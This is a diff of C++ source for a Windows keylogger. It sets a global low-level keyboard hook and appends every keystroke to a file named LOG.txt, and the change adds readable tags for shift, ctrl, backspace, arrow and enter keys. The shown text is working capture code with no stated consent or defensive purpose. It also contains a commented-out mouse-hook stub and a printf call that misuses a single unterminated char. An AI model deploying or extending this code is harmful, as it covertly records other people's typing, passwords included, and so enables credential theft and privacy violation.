@@ -87,51 +87,74 @@ using namespace std;
 HHOOK hHock = NULL;
 const char* file = "LOG.txt";
 
+
+// Save Pressed Key
 #pragma warning (disable : 4996)
 void SaveKey(char key)
 {
     FILE* outputFile;      
     outputFile = fopen(file, "a+");
     fprintf(outputFile, "%s", &key);
+    fclose(outputFile);   
+}
+
+
+
+// Save Pressed Special Key / Add text for each special key
+#pragma warning (disable : 4996)
+void SaveSpecialKey(const char* specialKey)
+{
+    FILE* outputFile;
+    outputFile = fopen(file, "a+");
+    fprintf(outputFile, specialKey);
     fclose(outputFile);
 }
 
 
 
-
-
+// HOOK -----------------------------------------------------------------------------------------------
 #pragma warning (disable : 4996)
 LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
-  PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
-
-    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+    if (nCode >= HC_ACTION) // Checks if wParam and lParam contain valid data or not. If nCode is HC_ACTION (0), then they do, otherwise they do not.
     {
-        switch (p->vkCode) {
 
-            // Invisible keys
-        //case VK_CAPITAL:	out << "<CAPLOCK>";		break;
-        //case VK_SHIFT:		out << "<SHIFT>";		break;
-        //case VK_LCONTROL:	out << "<LCTRL>";		break;
-        //case VK_RCONTROL:	out << "<RCTRL>";		break;
-        //case VK_INSERT:		out << "<INSERT>";		break;
-        //case VK_END:		out << "<END>";			break;
-        //case VK_PRINT:		out << "<PRINT>";		break;
-        //case VK_DELETE:		out << "<DEL>";			break;
-        //case VK_BACK:		out << "<BK>";			break;
+        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
 
-        //case VK_LEFT:		out << "<LEFT>";		break;
-        //case VK_RIGHT:		out << "<RIGHT>";		break;
-        //case VK_UP:			out << "<UP>";			break;
-        //case VK_DOWN:		out << "<DOWN>";		break;
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+        {
+            switch (p->vkCode) {
 
-         // Visible keys
-        default:
-            SaveKey(char(p->vkCode));
-            
-        }  
+                // Special Keys / Invisible keys
+            case VK_CAPITAL:	SaveSpecialKey("<CAPLOCK>");	break;
+            case VK_SHIFT:		SaveSpecialKey("<SHIFT>");		break;
+            case VK_LCONTROL:	SaveSpecialKey("<LCTRL>");		break;
+            case VK_RCONTROL:	SaveSpecialKey("<RCTRL>");		break;
+            case VK_INSERT:		SaveSpecialKey("<INSERT>");		break;
+            case VK_END:		SaveSpecialKey("<END>");		break;
+            case VK_PRINT:		SaveSpecialKey("<PRINT>");		break;
+            case VK_DELETE:		SaveSpecialKey("<DEL>");		break;
+            case VK_BACK:		SaveSpecialKey("<BK>");			break;
+            case VK_RETURN:		SaveSpecialKey("\n");			break;
+
+            case VK_LEFT:		SaveSpecialKey("<LEFT>");		break;
+            case VK_RIGHT:		SaveSpecialKey("<RIGHT>");		break;
+            case VK_UP:			SaveSpecialKey("<UP>");			break;
+            case VK_DOWN:		SaveSpecialKey("<DOWN>");		break;
+
+                // Ordinary keys / Visible keys
+            default:
+
+
+                SaveKey(char(p->vkCode));
+            }
+
+
+            char cc = (p->vkCode);
+            const char* gg = &cc;
+            printf("%s", gg);
+        }
     }
-
     return CallNextHookEx(hHock, nCode, wParam, lParam);
 }
 
@@ -141,8 +164,9 @@ int main()
 {
     MSG msg;
     hHock = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelHook, NULL, NULL);   // for mouse WH_MOUSE_LL
-
-    while (!GetMessage(&msg, NULL, NULL, NULL)) {
+   
+    while (!GetMessage(&msg, NULL, NULL, NULL))
+    {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
@@ -151,3 +175,45 @@ int main()
 }
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// -------------------------------------------------------------------------------------
+//
+//#include<Windows.h>
+//#include <stdio.h>
+//
+//
+//HHOOK hHock = NULL;
+//
+//LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
+//{
+//    printf("_a_");
+//    return CallNextHookEx(hHock, nCode, wParam, lParam);
+//}
+//
+//int main()
+//{
+//    MSG msg;
+//    hHock = SetWindowsHookEx(WH_MOUSE_LL, MyLowLevelHook, NULL, NULL);
+//
+//    while (!GetMessage(&msg, NULL, NULL, NULL)) {
+//        TranslateMessage(&msg);
+//        DispatchMessage(&msg);
+//    }
+//
+//    UnhookWindowsHookEx(hHock);
+//}
